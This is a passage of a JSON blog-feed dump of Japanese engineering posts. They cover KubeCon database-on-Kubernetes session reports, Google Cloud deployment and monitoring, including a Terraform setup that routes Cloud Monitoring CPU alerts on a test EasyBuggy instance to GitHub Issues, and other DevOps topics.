KubernetesはKubernetesを利用している組織でマネージドデータベースのコストを安くしたい場合や、データを自分たちのコントロールできる場所におきたい時に利用する選択肢と思っていました。しかしデータベースをKubenetesにデプロイすることでアプリケーションと密接に結合したテストを簡単に行えることがわかり、データベースの運用コストさえ許容できれば、他のメリットがなくてもデータベースをKubernetesで運用するのは十分ありなのではないかと意見が変わりました。今後は単なるデータベースのホスティング環境としてのKubernetes以外の部分にも注目していきたいです。","isoDate":"2024-12-14T18:55:02.000Z","dateMiliSeconds":1734202502000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Cloud Deploy で Cloud Run functions に継続的デリバリーする","link":"https://zenn.dev/kimitsu/articles/cloud-deploy-cloud-run-functions","contentSnippet":"Cloud Deploy は継続的デリバリーを行うための Google Cloud のフルマネージドサービスです。標準では Google Kubernetes Engine と Cloud Run (service と job) へのデプロイをサポートしていますが、カスタムターゲットを定義することでそれ以外の対象にもデプロイすることができます。今回はカスタムターゲットを利用して Cloud Run functions へのデプロイを自動化してみます。本記事では Cloud Deploy の基本的な概念（ターゲット、リリース、デプロイパイプラインなど）については説明しません。これら...","isoDate":"2024-12-14T01:17:49.000Z","dateMiliSeconds":1734139069000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"KubeCon NA 2024: Building Resilience: Effective Backup and Disaster Recovery for Vector Databases on Kubernetes のセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/13/building_resilienc_effective_backup_and_disaster_recovery_for_database_on_lubernetes","contentSnippet":"この記事は以下アドベントカレンダー13日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ2Building Resilience: Effective Backup and Disaster Recovery for Vector Databases on Kubernetes セッションレポートセッション概要:https://kccncna2024.sched.com/event/1i7kn/when-life-gives-you-containers-make-an-open-source-rds-a-kubernetes-love-story-sergey-pronin-perconawww.youtube.comKubeCon + CloudNativeCon North America 2024 のセッション \\"Building Resilience: Effective Backup and Disaster Recovery for Vector Databases on Kubernetes\\" は、AI アプリケーションにおけるベクトルデータベースの重要性と、Kubernetes 上での堅牢なデータ保護戦略の必要性を強調した示唆に富む内容でした。マーケティング的な観点や、聴衆の興味を引くためといった理由からかタイトルでベクトルデータベースとなっていますが、バックアップの部分ではあらゆるデータベースやステートフルワークロードに応用ができる内容でした。AI and Kubernetesセッションは、AI がアプリケーションにもたらす変革的な影響についての概説から始まりました。リソース需要予測による動的スケーリング、異常検知によるセキュリティ向上、UX の改善、そして事前の障害予測による可用性向上など、AI はアプリケーションのあらゆる側面を最適化する可能性を秘めています。そして、これらのメリットを実現する上で、Kubernetes が最適なプラットフォームとして位置づけられています。迅速なデプロイ、高可用性とスケーラビリティ、可搬性と柔軟性、分散ワークロード管理の効率化、そして効率的なバックアップとリカバリといった Kubernetes の特徴は、AI ワークロードの運用に不可欠な要素です。特に、データベースを Kubernetes 上で運用する組織が増加しているという Data on Kubernetes のレポートの言及は、AI/ML ワークロードとデータベース運用の密接な関係性を示唆しており、データベースエンジニアとして注目すべき点でした。Kubernetes がステートフルなアプリケーションの運用基盤として成熟しつつあることを改めて認識させられました。Kubernetes上でAIアプリケーションをデプロイする理由セッションでは、Kubernetes上でAIアプリケーションをデプロイする理由として、迅速なデプロイ、高可用性とスケーラビリティ、可搬性と柔軟性、分散ワークロードの管理の効率化、効率的なバックアップとリカバリ、そしてエコシステムとコミュニティの発展が挙げられていました。これらの利点は、クラウドネイティブな開発と運用を目指す上で非常に重要です。特に、マイクロサービスアーキテクチャを採用する際に、Kubernetes はサービスのデプロイと管理を簡素化し、スケーラビリティと可用性を向上させる上で強力なツールとなります。さらに、ベクトルデータベースのようなステートフルなサービスを Kubernetes 上で運用することで、データの永続性と可用性を確保し、AI アプリケーションの信頼性を向上させることができます。Vector Databases and RAGセッションの中核を成すのが、ベクトルデータベースと RAG (Retrieval Augmented Generation) の解説です。非構造化データの増加に伴い、従来のデータベースでは対応が難しくなってきた画像、テキスト、音声といったデータの効率的な処理が求められています。ベクトルデータベースは、これらの非構造化データをベクトル表現に変換し、類似度検索によって関連性の高い情報を高速に取得することを可能にします。Embedding Model を用いたベクトル化によって、意味的な検索が可能になり、AI アプリケーションの精度と効率性が向上する点が強調されていました。特に、生成 AI アプリケーションにおけるハルシネーション軽減とコンテキスト付与におけるベクトルデータベースの役割は重要です。RAG は、ベクトルデータベースを用いて関連情報を取得し、生成 AI の出力に信頼性を与える手法として紹介されており、今後の AI アプリケーション開発において不可欠な要素となるでしょう。ベクトルデータベースのユースケースセッションでは、ベクトルデータベースのユースケースとして、検索エンジン、画像検索、推薦アルゴリズム、異常検知、そしてチャットボットなどの生成 AI アプリケーションが挙げられていました。これらのユースケースは、現代のアプリケーション開発において非常に重要であり、ベクトルデータベースの適用範囲の広さを示しています。特に、マイクロサービスアーキテクチャにおいて、ベクトルデータベースを独立したサービスとして提供することで、様々なサービスから容易にアクセスできるようになり、システム全体の柔軟性と拡張性を向上させることができます。また、DevOps/SRE の実践においては、ベクトルデータベースの監視と運用を自動化することで、システムの信頼性と可用性を向上させることができます。Data Protectionデータ保護は、Kubernetes 上で運用されるベクトルデータベースにとって不可欠な要素です。データの整合性とセキュリティ、災害復旧、コストと時間の効率化、バージョンコントロール、そしてコンプライアンス規制への準拠など、データ保護は多岐にわたるメリットを提供します。セッションでは、Kubernetes 上でのベクトルデータベースのデータ保護方法として、ストレージスナップショット、データサービスを利用したストレージスナップショット、データサービスレベルのスナップショット、そしてこれらの組み合わせが紹介されました。PVC を利用した永続化データの保護は、Kubernetes ネイティブなデータ保護戦略を構築する上で重要なポイントです。Kanister のようなデータ保護ワークフロー管理ツールは、バックアップとリストアの手順を抽象化し、自動化することで、運用効率を大幅に向上させることができます。Kanister の Blueprint、Profile、ActionSet といった CRD を活用することで、柔軟なデータ保護ワークフローを定義し、Kubernetes の宣言的な運用を実現できます。Kanisterの動作Kanister の動作は、ActionSet が Controller に動作を開始するようにトリガーし、Controller が Blueprint を参照して定義されたオペレーションに従ってベクトルデータベースからバックアップを取得し、オブジェクトストレージに保存するという流れで実行されます。動作完了後、Controller は ActionSet に完了を伝え、ActionSet がユーザーに完了を通知します。この自動化されたワークフローは、データベースエンジニアの運用負荷を軽減し、ヒューマンエラーのリスクを最小限に抑える上で非常に有効です。また、バックアップとリストアのプロセスをコード化することで、再現性と信頼性を向上させることができます。Demoデモでは、書籍推薦チャットボット BookNest を例に、PostgreSQL と PGVector を利用したベクトルデータベースのバックアップとリストアのワークフローが紹介されました。提供された図とデモ動画は、Kanister を用いたデータ保護の実践的な方法を理解する上で非常に役立ちました。具体的な構成例を示すことで、視聴者は自身の環境に合わせたデータ保護戦略を検討する際の参考にすることができます。また、デモを通じて Kanister の操作方法やワークフローの定義方法を視覚的に理解することができ、実践的な知識を深めることができます。Kanister の Blueprint は Kubernetes の manifest 内で ShellScript を書くようなイメージでかけるため、すでに Kubernetesを利用している組織であれば利用に大きなハードルは少なそうだと感じました。Operator 化されたデータベースでは大きなメリットはないかもしれないですが、そうでないデータベースのバックアップや、Operator を使っていても複数の種類がある場合オペレーションの使用ツールの共通化という面で十分メリットがあるでしょう。Call to Actionセッションの締めくくりとして、AI アプリケーションとベクトルデータベースの重要性、そしてデータ保護の必要性が改めて強調されました。データ保護を Day 0 Operation と位置づけるというメッセージは、システム設計の初期段階からデータ保護を考慮することの重要性を示唆しています。システムの保守性、スケーラビリティ、セキュリティを確保する上で、データ保護は不可欠な要素であり、アプリケーション開発ライフサイクル全体を通じて考慮する必要があります。まとめこのセッションは、AI アプリケーションにおけるベクトルデータベースの重要性と、Kubernetes 上での堅牢なデータ保護戦略の構築方法について、具体的な例を交えながら分かりやすく解説していました。特に、Kanister のようなデータ保護ツールを活用することで、複雑なバックアップとリカバリのワークフローを簡素化し、自動化できる点が印象的でした。データベースを Kubernetes 上で運用する際には、データ保護を Day 0 Operation として捉え、Kanister のようなツールを活用することで、システムの信頼性と可用性を向上させることができます. セッションで提示された情報は、今後のデータベース運用戦略を検討する上で非常に貴重な示唆を与えてくれました。このセッションで扱われなかった点として、ベクトルデータベースの選択基準やパフォーマンスチューニング、そして異なるベクトルデータベースにおけるデータ保護戦略の差異などが挙げられます。今後のセッションでは、これらの点についても掘り下げて議論されることを期待します。","isoDate":"2024-12-13T08:57:05.000Z","dateMiliSeconds":1734080225000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"ｻｯとかざして即起動! 推しグッズを神曲再生アイテムに(*\xb0∀\xb0)","link":"https://zenn.dev/nedoko_dok0dko/articles/9db9d10902ec03","contentSnippet":"※3-shake Advent Calendar 2024の13日目のエントリー記事です。本日、12月13日は金曜日。世の中では「ジェイソンの日」なんて言われています。とはいえ、生まれてこの方ジェイソンの映画を見ることがなかったためこの手の話についてはかなり縁遠い気がしていします。(JSONの方先に連想しちゃいますし)むしろ「華金だーー＼(^o^)／」くらいしか考えていません。それしかありません。そんな社会人です。さて、今年もやってまいりましたアドベントカレンダー。2024年も引き続き参加させていただく運びとなりました。テーマは前回同様「技術・非技術関係なし!自由!」ということ...","isoDate":"2024-12-12T15:00:01.000Z","dateMiliSeconds":1734015601000,"authorName":"seno","authorId":"seno"},{"title":"GolangからPagerdutyのインシデントを発砲する","link":"https://zenn.dev/tayusa/articles/9091399d6a9018","contentSnippet":"目的Golangで作成したアプリケーションからPagerdutyの任意のインシデントを発砲する Event API v2https://developer.pagerduty.com/docs/3d063fd4814a6-events-api-v2-overview高信頼性、高可用性の非同期APIでシステムからマシンイベントを取り込みます。このAPIに送られたイベントは最終的にPagerDutyサービスにルーティングされ処理されます Event Types Alert監視システムの問題。 既存のアラートを確認または解決するためにイベントを送信することができる...","isoDate":"2024-12-11T13:30:34.000Z","dateMiliSeconds":1733923834000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Google Cloud monitoringのアラートをGitHub Issueに通知する","link":"https://kechigon.hatenablog.com/entry/2024/12/11/182649","contentSnippet":"タイトルの通り、Google Cloud monitoringのアラートをGitHub Issueに通知するシステムの構築方法を紹介します。terrafromを使って作成します。コードはGitHubリポジトリにまとまっています。github.comこのコードをapplyすることで、Webサービス(EasyBuggy)、監視、アラートをIssueに持っていくパイプラインがデプロイされます。システム図このような構成をとっています。main.tf早速コードを紹介していきます。このファイルでは、EasyBuggyという脆弱なWebサービスをGCEにデプロイします。terraform {  required_providers {    google = {        source = \\"hashicorp/google\\"        version = \\"5.39.0\\"    }  }}provider \\"google\\" {  credentials = var.credential_file  project     = var.project  region      = var.region}resource \\"google_compute_instance\\" \\"easybuggy\\" {  name         = \\"easybuggy-instance\\"  machine_type = \\"n1-standard-1\\"  zone         = var.zone  boot_disk {    initialize_params {      image = \\"debian-cloud/debian-11\\"    }  }  network_interface {    network = \\"default\\"        access_config {}  }  metadata = {    \\"enable-osconfig\\" = \\"true\\"  }     metadata_startup_script = <<EOF#!/bin/bashsudo apt-get updatefor pkg in docker.io docker-doc docker-compose podman-docker containerd runc; do sudo apt-get remove $pkg; donesudo apt-get install -y ca-certificates curl git sudo install -m 0755 -d /etc/apt/keyringssudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.ascsudo chmod a+r /etc/apt/keyrings/docker.ascecho \\\\  \\"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \\\\  $(. /etc/os-release && echo \\"$VERSION_CODENAME\\") stable\\" | \\\\sudo tee /etc/apt/sources.list.d/docker.list > /dev/nullsudo apt-get updatesudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-pluginsudo git clone https://github.com/k-tamura/easybuggy.gitcd easybuggysudo docker build . -t easybuggy:local sudo docker run -p 8080:8080 easybuggy:local EOF}resource \\"google_compute_firewall\\" \\"allow-home-ip\\" {  name    = \\"allow-home-ip\\"  network = \\"default\\"   allow {    protocol = \\"tcp\\"    ports    = [\\"8080\\"]  }  source_ranges = [var.my_ip]}output \\"instance_ip\\" {  value = google_compute_instance.easybuggy.network_interface[0].access_config[0].nat_ip}monitoring.tfこちらのファイルでは監視、アラートをIssueに持っていくパイプラインをデプロイします。main.tfでデプロイしたインスタンスのCPU使用率が80%を超えるとアラートが発生します。resource \\"google_pubsub_topic\\" \\"alerts_topic\\" {  name = \\"alerts-topic\\"}resource \\"google_pubsub_subscription\\" \\"alerts_subscription\\" {  name  = \\"alerts-subscription\\"  topic = google_pubsub_topic.alerts_topic.name}resource \\"google_monitoring_notification_channel\\" \\"pubsub_channel\\" {  display_name = \\"Pub/Sub to Cloud Function\\"  type         = \\"pubsub\\"  labels = {    \\"topic\\" = google_pubsub_topic.alerts_topic.id  }}resource \\"google_pubsub_topic_iam_binding\\" \\"alerts_topic_publisher\\" {  topic = google_pubsub_topic.alerts_topic.name  role    = \\"roles/pubsub.publisher\\"  members = [    \\"serviceAccount:service-${var.project_id}@gcp-sa-monitoring-notification.iam.gserviceaccount.com\\"  ]}resource \\"google_storage_bucket\\" \\"easybuggy_monitoring_function_bucket\\" {  name          = \\"easybubby_monitoring-functions-bucket\\"  location      = \\"ASIA-NORTHEAST1\\"  force_destroy = true}resource \\"google_storage_bucket_object\\" \\"function_source_object\\" {  name   = \\"function-source.zip\\"  bucket = google_storage_bucket.easybuggy_monitoring_function_bucket.name  source = \\"function-source.zip\\"}resource \\"google_cloudfunctions_function\\" \\"issue_creator_function\\" {  name        = \\"issue-creator-function\\"  description = \\"Receive Pub/Sub message from Google Cloud Monitoring and create a GitHub issue\\"  runtime    = \\"python39\\"  source_archive_bucket = google_storage_bucket.easybuggy_monitoring_function_bucket.name  source_archive_object = google_storage_bucket_object.function_source_object.name  entry_point           = \\"main\\"  region                = var.region  environment_variables = {    \\"GITHUB_API_TOKEN\\" = var.github_api_token    \\"GITHUB_REPO\\"      = var.github_repo    \\"GITHUB_OWNER\\"     = var.github_owner  }  event_trigger {    event_type = \\"providers/cloud.pubsub/eventTypes/topic.publish\\"    resource   = google_pubsub_topic.alerts_topic.id  }}resource \\"google_monitoring_alert_policy\\" \\"cpu_usage_policy\\" {  display_name = \\"High CPU Utilization Alert\\"  combiner     = \\"OR\\"  conditions {    display_name  = \\"CPU usage over 80%\\"    condition_threshold {      filter          = \\"metric.type=\\\\\\"compute.googleapis.com/instance/cpu/utilization\\\\\\" AND resource.type=\\\\\\"gce_instance\\\\\\"\\"      duration        = \\"60s\\"      comparison      = \\"COMPARISON_GT\\"      threshold_value = 0.8      }  }  enabled = true  notification_channels = [google_monitoring_notification_channel.pubsub_channel.id]}main.pyfunctionsで実行されるコードです。pub/subから受け取ったデータからアラートのtitleとbodyを抜き出してGithub Issueにポストします。import base64import jsonimport osimport loggingimport requestsfrom flask import Flask, requestapp = Flask(__name__)GITHUB_API_TOKEN = os.environ.get(\'GITHUB_API_TOKEN\')GITHUB_REPO = os.environ.get(\'GITHUB_REPO\')GITHUB_OWNER = os.environ.get(\'GITHUB_OWNER\')logging.basicConfig(level=logging.INFO)logger = logging.getLogger(__name__)def create_github_issue(data):    issue_title = f\\"Alert: {data[\'incident\'][\'incident_id\']}\\"    issue_body = data[\'incident\'][\'summary\']    logger.info(f\\"Creating issue with title: {issue_title} body: {issue_body}\\")    response = requests.post(        f\\"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/issues\\",        headers={            \\"Authorization\\": f\\"token {GITHUB_API_TOKEN}\\",            \\"Accept\\": \\"application/vnd.github.v3+json\\",        },        json={            \\"title\\": issue_title,            \\"body\\": issue_body,        },    )    if response.status_code == 201:        logger.info(\\"Issue created successfully\\")        return \\"Issue created successfully\\", 201    else:        logger.error(f\\"Failed to create issue: {response.content}\\")        return f\\"Failed to create issue: {response.content}\\", response.status_code@app.route(\'/\', methods=[\'POST\'])def main(d, context): #Need to receive arguments    envelope = request.get_json()        if not envelope:        logger.error(\\"No envelope received\\")        return \\"Bad Request\\", 400        logger.info(f\\"envelope: {envelope}\\")    pubsub_data = envelope.get(\'data\', {})    logger.info(f\\"pub_sub_data\\")    if not pubsub_data:        logger.error(f\\"No outside data received: \\")        return \\"Bad Request\\", 400    try:        data_base64 = pubsub_data.get(\'data\', \'\')        if not data_base64:            raise ValueError(\\"No data field in outside data\\")                data = base64.b64decode(data_base64.encode(\'utf-8\')).decode(\'utf-8\')        logger.info(f\\"Decoded data: {data}\\")        data = json.loads(data)                logger.info(f\\"Received data: {data}\\")    except Exception as e:        logger.error(f\\"Error processing message: {e}\\")        return \\"Bad Request\\", 400        return create_github_issue(data)if __name__ == \\"__main__\\":    app.run()デプロイ内容を理解したらterraform applyしましょう。アプライが成功したらインスタンスIPが表示されます。動作確認http://instance_ip:8080にブラウザでアクセスするとこのような画面になります。「無限ループ」のリンクを押し、無限ループを発生させましょう。CPU使用率が80%を超えたことを確認し、GitHub Issueを確認すると、アラートが通知されています。以上がGoogle Cloud monitoringのアラートをGitHub Issueに通知する流れとなります。","isoDate":"2024-12-11T09:26:49.000Z","dateMiliSeconds":1733909209000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"Kube-schedulerプラグインCoschedulingを体験してみた","link":"https://zenn.dev/k_nagase/articles/co_scheduling","contentSnippet":"本記事は 3-shake Advent Calendar 2024 シリーズ 1 の 11 日目の記事です。 はじめにここ最近Kubernetesのスケジューリングについて調査する機会があり、その一環でスケジューラープラグインの1つであるCoschedulingについても調査しました。この時の調査と簡単なハンズオンについてこの記事でまとめてみたいと思います。Kubernetesのコントロールプレーンの1コンポーネントであるスケジューラはpluginによる機能拡張が可能です。プラグインは以下のリポジトリにまとまっています。https://github.com/kubernetes...","isoDate":"2024-12-11T01:00:01.000Z","dateMiliSeconds":1733878801000,"authorName":"Kohei Nagase","authorId":"k-nagase"},{"title":"スリーシェイクインタビュー: 技術顧問 うたもくさん編","link":"https://sreake.com/blog/interview-utam0k/","contentSnippet":"こんにちは。スリーシェイクのSreake事業部所属の早川(@bells17)です。 今回は7月からスリーシェイクの技術顧問に就任してもらったうたもくさん(@utam0k)に対談形式でインタビューをさせていただきましたので […]The post スリーシェイクインタビュー: 技術顧問 うたもくさん編 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-10T04:16:19.000Z","dateMiliSeconds":1733804179000,"authorName":"Sreake","authorId":"Sreake"},{"title":"LookMLで値を変換したい？それならcaseはいかが?","link":"https://zenn.dev/nedoko_dok0dko/articles/c677f78d5ae2b0","contentSnippet":"はじめに※本投稿はLooker Advent Calendar 2024 の10日目の記事となりますはじめまして。偶然業務でLookerに出会い、そこから色々触っているデータエンジニアです。Lookerについてはまだまだ駆け出しの身ではありますが、少しずつ分かる事が増え、Lookerへの理解が深まってきたと感じています。今回はそんな初心者がLookerのフィールドパラメータであるcaseを触ってみた話です。 想定読者Lookerについて基本概要を知っているLookMLを知っているLookMLを触ったことがある・実装したことがある 背景・経緯※情報に関して...","isoDate":"2024-12-09T16:42:38.000Z","dateMiliSeconds":1733762558000,"authorName":"seno","authorId":"seno"},{"title":"「Cloud Run functions」にコンテナがデプロイできるの知ってる？","link":"https://zenn.dev/kimitsu/articles/deploy-container-to-cloud-run-functions","contentSnippet":"!本記事はネタ記事です！Cloud Run functions は Google Cloud の FaaS です。ユーザはコンテナ、ランタイム、Web サーバーを管理することなく、コードを書くだけでデプロイすることができます。本来はコンテナ化が不要な Cloud Run functions ですが、コンテナをデプロイできることをご存知でしょうか。 Cloud Run functions の仕組みユーザが Cloud Run functions にデプロイしたコードは複数の抽象化レイヤーの上で動きます。[1]一番内側にユーザが書いたコードがあり、その下にはまず Func...","isoDate":"2024-12-08T13:16:22.000Z","dateMiliSeconds":1733663782000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"【GitHub Actions】編集されたディレクトリに応じてラベルを付与する","link":"https://zenn.dev/kamos/articles/16def632754577","contentSnippet":"はじめに最近になってTerraformを触る機会が少し増えてきました。そのリポジトリはdevelopment, staging, productionのそれぞれのディレクトリがありました。.└── environments    ├── development    │   ├── main.tf    │   └── xxx.tf    ├── staging    │   ├── main.tf    │   └── xxx.tf    └── production        ├── main.tf        └── xxx.tfこの構成では環境...","isoDate":"2024-12-08T13:14:28.000Z","dateMiliSeconds":1733663668000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":" KubeCon NA 2024: The Future of DBaaS on Kubernetesのセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/08/kubecon_na_the_future_of_dbaas_ob_kubernetes","contentSnippet":"この記事は以下アドベントカレンダー8日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ2The Future of DBaaS on Kubernetesのセッションレポートセッション概要:https://kccncna2024.sched.com/event/1i7kL/the-future-of-dbaas-on-kubernetes-melissa-logan-constantia-sergey-pronin-percona-deepthi-sigireddi-planetscale-gabriele-bartolini-edbセッション動画:https://www.youtube.com/watch?v=Z35SlsYd1ds「The Future of DBaaS on Kubernetes」は、Data on Kubernetes Communityのメンバーによるパネルディスカッション形式で、Kubernetes上で動作するDBaaSの将来について議論されました。ここ数年でデータベースをKubernetes上で動かすにあたりどう便利になったか？セッションでは、Kubernetesにおけるストレージとネットワーキングの進化が、データベース運用を大きく改善した点が強調されました。Volume Snapshotなどのストレージ関連機能の向上は、バックアップとリカバリといったDay 2 Operationを効率化し、Local Persistent Volumeの導入と改善は、データベースの高可用性とディザスタリカバリ構成をシンプルに実現可能にしました。また、Cilium Network PolicyやIngress/Egressといったネットワーキング機能は、マルチテナントサービスにおけるアクセス制御を容易にし、セキュリティ強化に貢献しています。これらの改善により、増加するデータベースと、優秀なデータベースエンジニア不足という課題に対し、Kubernetesは少ない人員でデータベースをスケールさせる有効な手段となっています。数年前に比べ、Kubernetes上でのデータベース運用はより現実的になり、エンタープライズグレードの運用にも耐えうるレベルに達しています。これは、Kubernetesがステートレスなアプリケーションだけでなく、ステートフルなデータベースにも適したプラットフォームへと進化したことを示しています。私がKubernetesを触り始めた時点ではここで紹介されているほとんどの機能はサポートされており、なぜKubernetesでデータベースを運用することが難しいのかを理解しきれない面がありました。このセクションによる直近のデータベース観点でのKubernetesのアップデートの紹介により、何が障壁でそれがどのように解決されたのかの理解が深まりました。Kubernetes上でデータベースを動かしている顧客についてシェアできる事例はあるか？セッションでは、Nokia、Broadcom、HubSpot、Shopify、IBMなど、様々な企業がKubernetes上でデータベースを運用している事例が紹介されました。これらの事例は、マイクロサービスアーキテクチャの普及と密接に関連しています。マイクロサービス化されたアプリケーションでは、単一のモノリシックなデータベースではなく、サービスごとにデータベースを持つ傾向があり、Kubernetesはそのような分散データベース環境の構築と管理を容易にします。特に、開発者がデータベースを所有し、インフラ管理者がDBaaSをインターフェイスとしてデータベースを払い出すという新しい運用モデルは、今後の主流となる可能性を示唆しています。これは、DevOpsの原則をデータベース運用に取り入れることで、開発速度と運用効率を向上させるアプローチと言えるでしょう。セクション内で紹介されている開発者がデータベースを所有し、インフラ管理者がデータベースを払い出すという体制はパブリッククラウドで運用されるマイクロサービスアーキテクチャでは当たり前のように実践されており、Kubernetesでも今後の主流となると考えることは不思議ではないでしょう。そしてそれは従来のVMやベアメタルベースのDBAがデータベース管理を行うには多すぎるデータベースが運用され、限界を迎えることは想像に難くなく、KubernetesとOperatorによる運用の簡略化は必須と言えるかもしれません。Kubernetes上でデータベースを動かすにあたりベストプラクティスはなにか？ベストプラクティスとして、クラウド中立性、クラウドレディネス、セルフサービス、セキュリティ、アーキテクチャ設計などが挙げられました。Operatorの活用は、クラウドベンダーに依存しない運用を実現する上で重要であり、UI/APIの整備やArgoCDなどのツールとの連携により、データベースのプロビジョニングと管理を自動化できます。また、開発者が容易にスケーリングやテスト環境構築を行えるセルフサービス環境も重要です。セキュリティについては、業界標準やコンプライアンス要件に合わせたポリシー設定が不可欠です。アーキテクチャ設計では、PostgreSQLを例に、Kubernetesの機能を活用した高可用性構成や、複数のアベイラビリティゾーンを考慮した設計が重要となります。さらに、Kubernetesの標準APIを活用することで、オブザーバビリティやセキュリティ、証明書の管理を簡素化し、他のコンポーネントとの統合を容易にすることが推奨されています。VMからの移行時には、ストレージを分離することでリソース管理の予測精度を高めることが重要です。ここではベストプラクティスとしてユーザーがセルフサービスでデータベースを立ち上げる方法としてGUIとAPIとツール連携による自動化二つの観点が出ていました。個人的にはパブリッククラウドとIaCの流れを見るにGUIベースよりAPIによる自動化が主流になっていくのではないかと考えます。またデータベースではないですがオンプレミスのVMベースシステムからKubernetesのコンテナベースに移行するプロジェクトに関わった時は独自のプロトコルによる通信をVMで実装しており、その方法をコンテナの世界に持ち込もうとした結果非常に複雑になっていた事例を見たことがあります。そのため、ここで紹介されているKubernetesとそのエコシステムに合わせることは不可欠ではないかと感じます。データベースをKubenetesで動かす場合の課題や落とし穴はあるか？セッションでは、VM環境での運用とKubernetes環境での運用を混同してしまうこと、マイグレーション計画の不足、リソースの過剰確保、そして人材育成の課題が議論されました。既存のVM向けスクリプトをそのままKubernetesに適用しようとするのではなく、クラウドネイティブな考え方を取り入れ、スケーラビリティと信頼性の向上に焦点を当てるべきです。マイグレーションにおいては、全てのワークロードの移行と、ダウンタイム最小化を両立するための綿密な計画が必要です。リソース管理においては、Kubernetesの柔軟性を活かし、適切なリソース割り当てを行うための実験と調整が重要です。さらに、DBAがKubernetesの基礎知識を習得し、データベース運用における新たなパラダイムシフトに対応できるよう、人材育成に力を入れる必要があります。このセッションを通して一番に感じたのはオンプレからパブリッククラウドへの移行と気にするところは同じだということと、DBAとKubernetesの距離を近づけることはやはり大事だということでした。特にDBAとKubernetesについてはより簡単なソリューションとして存在してしまっているマネージドデータベースが、Kubernetesを利用することから目を背けさせてしまう要因になっていると感じます。しかしDBAがより求められるのはデータベースをセルフホストする場合で、今後DBAとして活躍していくにはLinuxに適応してきたようにKubernetesに適応していく日強うがあると考えています。DBaaSの将来はどのように変わっていくと考えるか？将来のDBaaSは、Kubernetesとの統合がさらに深まり、データベースとKubernetesの境界が曖昧になっていくと予測されています。PostgreSQLの例では、Kubernetesとの親和性を高めるためのパッチ適用や、拡張機能のコンテナ化などが進んでいます。また、プライベートDBaaSだけでなく、商用DBaaSのKubernetes上での提供も増加し、データベースサービスの利用がさらに容易になると考えられます。Google Cloudなどのクラウドプロバイダーも、将来的にKubernetes上でマネージドデータベースサービスを提供する可能性があり、これにより、数千規模のデータベース管理が容易になるでしょう。Kubernetesの普及と成熟に伴い、Helm ChartやYAML以外の、より洗練されたUXも期待されます。セッション内ではGoogle CloudではCloud SQLがKubenetes1で運用される未来があるかもしれないと言及していましたが、すでにSpannerはKubernetesで動いています。商用DBaaSがKubernetesで動くことについてはよくある構成ですが、プライベートDBaaSがKubernetes上で動き、さまざまなエコシステムと組み合わせてAPIベースなど自動化に適したUXが提供されていくことには非常に注目しています。まとめ「The Future of DBaaS on Kubernetes」セッションは、Kubernetes上でのデータベース運用が成熟期を迎えていることを示しました。ストレージとネットワーキングの進化、Operatorの普及、そして様々な企業での成功事例は、Kubernetesがデータベース運用のための堅牢でスケーラブルなプラットフォームであることを証明しています。クラウドネイティブなアプローチ、セルフサービス化、セキュリティ強化、そして適切なアーキテクチャ設計は、Kubernetes上でのデータベース運用を成功させるための鍵となります。同時に、VM環境からの移行、リソース管理、人材育成といった課題にも適切に対処する必要があります。今後のDBaaSは、Kubernetesとの統合がさらに進み、データベースサービスの利用がより容易になると期待されます。このセッションで得られた知見は、今後のデータベース運用戦略策定に役立つ貴重な情報源となるでしょう。特に、オンプレミスでマイクロサービスアーキテクチャを採用する組織にとって、Kubernetesはデータベース運用における重要な選択肢となるでしょう。↩","isoDate":"2024-12-08T03:00:00.000Z","dateMiliSeconds":1733626800000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"KubeCon NA 2024: When Life Gives You Containers, Make an Open Source RDS: A Kubernetes Love Story のセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/11/when_life_gives_you_containers_make_an_open_source_rds_a_kubernetes_love_story","contentSnippet":"この記事は以下アドベントカレンダー11日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ1When Life Gives You Containers, Make an Open Source RDS: A Kubernetes Love Story セッションレポートセッション概要:https://kccncna2024.sched.com/event/1i7kn/when-life-gives-you-containers-make-an-open-source-rds-a-kubernetes-love-story-sergey-pronin-perconaセッション動画:https://www.youtube.com/watch?v=0gSSmdNB-Zoこのセッションは、オープンソースRDS、あるいはオープンソースDBaaSをKubernetes上で構築・運用する道のりを、物語風に語っています。セッションを通して、Kubernetes上でデータベースを運用することへの不安や課題を解消し、そのメリットと可能性を提示することを目指していると感じました。なぜKubernetesでデータベースを動かすのか？セッション冒頭では、スピーカーが4年前はKubernetesでデータベースを動かすことに懐疑的だったものの、現在は大きく考えが変わっていることが語られています。その理由として、クラウドニュートラル戦略、コスト削減、そして自動化の3点が挙げられています。特に自動化は、高可用性構成、Blue/Greenデプロイ、フェイルオーバーなどを容易にする点で重要です。これらのメリットは、マイクロサービスアーキテクチャやクラウドネイティブ開発において、データベース運用を効率化し、DevOps実践を促進する上で大きな力となります。従来の運用では、データベースのデプロイや管理に多くの手作業が必要でしたが、Kubernetesと自動化ツールを組み合わせることで、これらの作業を大幅に簡素化し、開発スピードの向上に貢献できます。一方、Kubernetes上でのデータベース運用に対する懸念として、パフォーマンスの劣化、Kubernetes自体の成熟度、そして複雑さが挙げられています。これらの懸念は、データベースエンジニアとして当然抱くものであり、セッション全体を通してこれらの懸念への回答が提示されています。このセクションでは、Kubernetes上でデータベースを運用する上でのメリットと課題が明確に示されており、導入を検討する上で重要なポイントが提示されています。特に、クラウドネイティブな環境におけるデータベース運用の重要性が強調さ